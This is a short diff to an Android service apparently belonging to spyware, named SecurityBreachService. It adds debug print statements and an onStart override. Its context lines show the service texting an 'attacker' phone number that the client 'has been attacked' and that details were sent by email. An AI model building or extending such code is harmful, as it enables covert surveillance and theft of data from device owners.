@@ -20,6 +20,7 @@ public class SecurityBreachService extends Service {
 
 	@Override
 	public IBinder onBind(Intent arg0) {
+		System.out.println("Binding.. !!");
 		return null;
 	}
 
@@ -34,6 +35,11 @@ public class SecurityBreachService extends Service {
 		SmsManager sms = SmsManager.getDefault();
 		sms.sendTextMessage(attackerMobile, null, 
 				"Client has been attacked..Details sent to email" , null, null);
+	}
+	
+	@Override
+	public void onStart(Intent intent, int startid) {
+		System.out.println("On start overrided");
 	}
 
 	public int sendEmail() {
